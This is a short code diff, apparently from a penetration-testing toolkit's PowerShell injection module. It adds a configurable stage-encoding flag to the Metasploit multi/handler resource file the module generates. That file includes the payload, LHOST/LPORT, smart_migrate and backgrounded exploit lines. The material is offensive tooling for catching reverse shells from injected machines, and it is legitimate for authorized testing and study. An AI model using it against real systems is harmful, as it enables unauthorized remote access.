@@ -6,6 +6,11 @@ import os
 import time
 from src.core.setcore import *
 
+# grab stage encoding flag
+stage_encoding = check_config("STAGE_ENCODING=").lower()
+if stage_encoding == "off": stage_encoding = "false"
+else: stage_encoding = "true"
+
 # check to see if we are just generating powershell code
 powershell_solo = check_options("POWERSHELL_SOLO")
 
@@ -61,7 +66,7 @@ if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
                 filewrite.write("\nuse exploit/multi/handler\n")
                 if auto_migrate == "ON":
                     filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
-                filewrite.write("set PAYLOAD %s\nset LHOST %s\nset LPORT %s\nset EnableStageEncoding true\nset ExitOnSession false\nexploit -j\n" % (powershell_inject_x86, ipaddr, port))
+                filewrite.write("set PAYLOAD %s\nset LHOST %s\nset LPORT %s\nset EnableStageEncoding %s\nset ExitOnSession false\nexploit -j\n" % (powershell_inject_x86, ipaddr, port, stage_encoding))
                 filewrite.close()
 
 # if we have multi injection on, don't worry about these
@@ -78,7 +83,9 @@ if multi_injection != "on":
                 update_options("PORT=" + port)
 
 # turn off multi_injection if we are riding solo from the powershell menu
-if powershell_solo == "ON": multi_injection = "off"
+if powershell_solo == "ON": 
+    multi_injection = "off"
+    pyinjection = "on"
 
 # if we are using multi powershell injection
 if multi_injection == "on":
